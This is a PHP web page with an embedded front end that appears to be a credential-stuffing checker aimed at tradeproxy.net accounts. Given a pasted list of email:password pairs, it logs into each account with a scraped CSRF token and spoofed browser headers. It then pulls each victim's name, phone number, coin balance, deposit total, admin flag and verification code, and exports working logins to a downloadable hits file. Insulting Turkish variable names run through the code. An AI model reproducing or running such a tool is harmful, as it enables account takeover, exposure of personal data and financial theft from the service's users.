<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    function trade_curl($url, $post = null, $headers = []) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $response = curl_exec($ch);
        
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        curl_close($ch);
        return $response;
    }

    function lr_parse($string, $left, $right) {
        $data = explode($left, $string);
        if (isset($data[1])) {
            $data = explode($right, $data[1]);
            return $data[0];
        }
        return null;
    }

    $ch = curl_init("https://tradeproxy.net/api/auth/csrf");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 OPR/127.0.0.0 (Edition std-2)");
    $res1 = curl_exec($ch);
    preg_match('/next-auth.csrf-token=([^;]+)/', $res1, $csrfMatch);
    $csrfCookie = $csrfMatch[1] ?? '';
    $body1 = substr($res1, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
    $csrfToken = lr_parse($body1, '"csrfToken":"', '"');
    curl_close($ch);

    $loginData = http_build_query([
        'email' => $user,
        'password' => $pass,
        'device_id' => 'ea0d94a868b9b4ba043bcc604ab20ec5',
        'device_name' => 'Web',
        'redirect' => 'false',
        'csrfToken' => $csrfToken,
        'callbackUrl' => 'https://tradeproxy.net/login',
        'json' => 'true'
    ]);

    $ch = curl_init("https://tradeproxy.net/api/auth/callback/credentials");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $loginData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/x-www-form-urlencoded",
        "Cookie: next-auth.csrf-token=$csrfCookie",
        "Origin: https://tradeproxy.net",
        "Referer: https://tradeproxy.net/login",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 OPR/127.0.0.0 (Edition std-2)"
    ]);
    $res2 = curl_exec($ch);
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $res2, $matches);
    $canımkurabiyeçekktiyahhh = implode('; ', $matches[1]);
    curl_close($ch);

    $res3 = trade_curl("https://tradeproxy.net/api/auth/session", null, [
        "Cookie: $canımkurabiyeçekktiyahhh",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 OPR/127.0.0.0 (Edition std-2)",
        "Accept: application/json"
    ]);
    $doğrulamamgerekirmisenvarken = lr_parse($res3, '"access_token":"', '"');
    $adminidesikiyimsenide = lr_parse($res3, '"is_admin":', ',');
    $doğrulamamnısikimya = lr_parse($res3, '"verifysend_at":"', '"');

    if ($doğrulamamgerekirmisenvarken) {
        
        $meRes = trade_curl("https://api.tradeproxy.vn/v1/me", null, [
            "Host: api.tradeproxy.vn",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: tr,en-US;q=0.9,en;q=0.8,de;q=0.7",
            "Authorization: Bearer $doğrulamamgerekirmisenvarken",
            "Origin: https://tradeproxy.net",
            "Priority: u=1, i",
            "Referer: https://tradeproxy.net/",
            "Sec-Ch-Ua: \"Opera GX\";v=\"127\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
            "Sec-Ch-Ua-Mobile: ?0",
            "Sec-Ch-Ua-Platform: \"Windows\"",
            "Sec-Fetch-Dest: empty",
            "Sec-Fetch-Mode: cors",
            "Sec-Fetch-Site: cross-site",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 OPR/127.0.0.0 (Edition std-2)",
            "X-App-Locale: en"
        ]);

        $annanısiktimoglum = lr_parse($meRes, '"first_name":"', '",') ?? 'Bilinmiyor';
        $coinUsd = lr_parse($meRes, '"coin_usd":', ',"') ?? '0';
        $asosyemisinmerak = lr_parse($meRes, '"verify_code":"', '"') ?? 'Yok';
        $paraönemlimisenolmadıkdansonra = lr_parse($meRes, '"total_deposit_usd":', '}') ?? '0';
        
        $sikerimşidiya = lr_parse($meRes, '"phone":"', '"') ?? 'Yok';

        echo json_encode([
            'status' => 'success',
            'user' => $user, 
            'pass' => $pass,
            'sayi' => $coinUsd, 
            'arabalar' => "İsim: $annanısiktimoglum | Tel: $sikerimşidiya | Admin: ".($adminidesikiyimsenide ?? 0)." | Yatırılan: $paraönemlimisenolmadıkdansonra USD | Mail Zamanı: ".($doğrulamamnısikimya ?? 'Yok')." | Kod: $asosyemisinmerak"
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user, 'pass' => $pass]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRADEPROXY EXPORT EDITION | CPM STYLE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #030508; color: #e2e8f0; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .neon-blue { box-shadow: 0 0 15px rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.3); }
        .neon-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); }
        .neon-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); }
        .main-card { background: rgba(15, 18, 26, 0.9); backdrop-filter: blur(10px); border-radius: 16px; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.05); }
        .input-area { background: #0a0c12; border: 1px solid #1f2937; border-radius: 12px; color: #60a5fa; font-family: 'Consolas', monospace; width: 100%; outline: none; }
        .hit-box { background: linear-gradient(145deg, #0f121a, #0a0c12); border-left: 4px solid #10b981; border-radius: 12px; }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-8">
        <div class="flex items-center gap-3">
            <div class="w-11 h-11 bg-blue-600 rounded-lg flex items-center justify-center shadow-lg shadow-blue-600/30"><i class="fas fa-microchip text-white text-xl"></i></div>
            <h1 class="text-2xl font-black tracking-tighter italic" style="font-family: 'Syncopate', sans-serif;">TRADE<span class="text-blue-500">Proxy</span></h1>
        </div>
        <a href="index.php" class="bg-white/5 hover:bg-red-500 border border-white/10 px-5 py-2.5 rounded-xl text-xs font-black uppercase tracking-widest transition-all italic">Geri Çıkış</a>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-5 mb-8">
        <div class="main-card p-6 neon-blue">
            <span class="text-gray-500 text-[10px] font-black uppercase mb-1.5 block">Kalan</span>
            <div class="text-4xl font-black" id="kalan_val">BİTTİ</div>
        </div>
        <div class="main-card p-6 neon-green">
            <span class="text-green-500 text-[10px] font-black uppercase mb-1.5 block">Hit</span>
            <div class="text-4xl font-black text-green-500" id="hit_count">0</div>
        </div>
        <div class="main-card p-6 neon-red">
            <span class="text-red-500 text-[10px] font-black uppercase mb-1.5 block">Fail</span>
            <div class="text-4xl font-black text-red-500" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-4 space-y-5">
            <div class="main-card p-6">
                <textarea id="accs" class="input-area h-[220px] p-4 text-xs" placeholder="mail:pass"></textarea>
                <button id="btn" onclick="startCheck()" class="w-full mt-5 py-4 bg-blue-600 rounded-xl text-white font-black uppercase tracking-widest text-sm shadow-md active:scale-95 transition-all">Taramayı Başlat</button>
            </div>
            <div class="main-card p-5 h-32 overflow-y-auto bg-black/50 font-mono text-[10px]" id="mini_log">Sistem Hazır.</div>
        </div>

        <div class="lg:col-span-8">
            <div class="flex justify-between items-end mb-4">
                <h2 class="text-xl font-black uppercase italic">Canlı Sonuçlar</h2>
                <button onclick="downloadHits()" class="bg-green-600 text-white px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest">TXT İndir</button>
            </div>
            <div class="main-card p-6 h-[660px] overflow-y-auto space-y-5" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full opacity-10 italic font-black uppercase">Veri Bekleniyor...</div>
            </div>
        </div>
    </div>

    <script>
        let running = false; let hits = 0; let fails = 0; let hitResults = [];
        async function startCheck() {
            const list = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
            if(!list.length) return alert("Liste boş!");
            if(running) { running = false; return; }
            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "DURDUR"; btn.classList.replace('bg-blue-600', 'bg-red-600');
            document.getElementById('kalan_val').innerText = list.length;
            for(let line of list) {
                if(!running) break;
                const [u, p] = line.trim().split(':');
                try {
                    const fd = new FormData(); fd.append('user', u); fd.append('pass', p);
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();
                    if(res.status === 'success') {
                        hits++; document.getElementById('hit_count').innerText = hits;
                        hitResults.push(`${res.user}:${res.pass} | ${res.arabalar}`);
                        addHit(res);
                    } else { fails++; document.getElementById('fail_count').innerText = fails; }
                } catch(e) { }
                document.getElementById('kalan_val').innerText = parseInt(document.getElementById('kalan_val').innerText) - 1;
            }
            running = false; btn.innerText = "BAŞLAT"; btn.classList.replace('bg-red-600', 'bg-blue-600');
        }

        function addHit(res) {
            const log = document.getElementById('hitLog');
            if(hits === 1) log.innerHTML = '';
            const div = document.createElement('div');
            div.className = 'hit-box p-5 mb-4 border-l-4 border-blue-500';
            div.innerHTML = `
                <div class="flex justify-between items-center mb-2">
                    <span class="text-xs font-bold text-blue-400">${res.user}</span>
                    <span class="text-2xl font-black text-green-500">$${res.sayi}</span>
                </div>
                <div class="text-[10px] font-mono text-gray-400 italic">${res.arabalar}</div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (!hitResults.length) return;
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = `TradeProxy_Hits.txt`; a.click();
        }
    </script>
</body>
</html>